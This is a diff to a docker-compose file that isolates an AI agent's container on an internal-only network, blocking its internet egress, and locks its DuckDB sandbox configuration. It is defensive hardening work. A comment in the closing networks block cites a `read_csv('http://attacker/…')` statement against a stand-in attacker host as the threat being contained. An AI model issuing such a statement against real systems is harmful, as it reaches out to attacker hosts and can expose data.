@@ -29,6 +29,11 @@ services:
   minio:
     image: minio/minio:${MINIO_IMAGE_TAG:-latest}
     restart: unless-stopped
+    # Joins the agent's isolated network in addition to `default`, so the
+    # agent can reach it while this service keeps its own outbound access.
+    networks:
+      - default
+      - duckhaven_internal
     entrypoint:
       - /bin/sh
       - -c
@@ -75,6 +80,11 @@ services:
   polaris:
     image: apache/polaris:${POLARIS_IMAGE_TAG:-latest}
     restart: unless-stopped
+    # Joins the agent's isolated network in addition to `default`, so the
+    # agent can reach it while this service keeps its own outbound access.
+    networks:
+      - default
+      - duckhaven_internal
     depends_on:
       polaris-bootstrap:
         condition: service_completed_successfully
@@ -133,6 +143,11 @@ services:
   api:
     image: ghcr.io/tamasmrtn/duckhaven-api:${DUCKHAVEN_IMAGE_TAG:-latest}
     restart: unless-stopped
+    # Joins the agent's isolated network in addition to `default`, so the
+    # agent can reach it while this service keeps its own outbound access.
+    networks:
+      - default
+      - duckhaven_internal
     ports:
       - "8000:8000"
     depends_on:
@@ -254,6 +269,11 @@ services:
     cap_drop:
       - ALL
     pids_limit: 512
+    # Egress restriction: the agent is on the isolated network ONLY, so it can
+    # reach api/polaris/minio/otel-collector and nothing else. See the networks
+    # block at the bottom of this file.
+    networks:
+      - duckhaven_internal
     depends_on:
       api:
         condition: service_healthy
@@ -267,10 +287,16 @@ services:
       # The control plane reaches the result server across the compose network,
       # so bind all interfaces rather than loopback.
       RESULTS_HTTP_HOST: 0.0.0.0
-      # DuckDB filesystem sandbox (off by default — the bundled Polaris + MinIO
-      # speak plain HTTP, so disabling HTTPFileSystem would break them). Set to
-      # "HTTPFileSystem" only on an HTTPS-only, egress-firewalled deployment.
+      # DuckDB filesystem sandbox. Off by default because the agent reads
+      # presigned staging URLs over http(s) — disabling HTTPFileSystem breaks
+      # SQL-session staging. (It does NOT break the bundled Polaris/MinIO: the
+      # iceberg REST client and S3FileSystem are independent of it.) Set to
+      # "HTTPFileSystem" on a deployment that does not use staging.
       SANDBOX_DISABLED_FILESYSTEMS: ${SANDBOX_DISABLED_FILESYSTEMS:-}
+      # Lock DuckDB's configuration once the agent has set the connection up, so
+      # a session statement cannot re-widen its own sandbox with SET. On by
+      # default; set false only to diagnose a suspected interaction.
+      SANDBOX_LOCK_CONFIGURATION: ${SANDBOX_LOCK_CONFIGURATION:-true}
       # OpenTelemetry tracing (empty = disabled), same collector as the api.
       OTEL_EXPORTER_OTLP_ENDPOINT: ${OTEL_EXPORTER_OTLP_ENDPOINT:-http://otel-collector:4318}
     volumes:
@@ -308,6 +334,11 @@ services:
   otel-collector:
     image: otel/opentelemetry-collector:${OTEL_COLLECTOR_IMAGE_TAG:-latest}
     restart: unless-stopped
+    # Joins the agent's isolated network in addition to `default`, so the
+    # agent can reach it while this service keeps its own outbound access.
+    networks:
+      - default
+      - duckhaven_internal
     command: ["--config=/etc/otelcol/config.yaml"]
     depends_on:
       tempo:
@@ -335,3 +366,24 @@ volumes:
   minio_data:
   agent_results:
   tempo_data:
+
+# Agent egress restriction. `duckhaven_internal` is an isolated bridge with no
+# route off the host and no external DNS, so a container attached ONLY to it
+# cannot reach the internet — verified: in-network service calls succeed while
+# an external address returns "Network is unreachable".
+#
+# This is the control that contains `read_csv('http://attacker/…')` from a
+# session statement. The API statement policy rejects such a statement first;
+# this is the second layer the design called for, enforced by the kernel rather
+# than by a parser. The agent is the only service placed on this network alone;
+# api/polaris/minio/otel-collector join it *in addition to* `default`, so they
+# keep the outbound access they legitimately need (OIDC, external object stores,
+# image-side calls) and stay reachable from the agent.
+#
+# Cost: an agent whose catalogs use EXTERNAL storage (s3 / adls_gen2), or that
+# must reach an off-host Polaris, needs real internet — those deployments opt out
+# with deploy/docker-compose.egress-opt-out.yml. See docs/concepts/sql-sessions.md.
+networks:
+  default:
+  duckhaven_internal:
+    internal: true
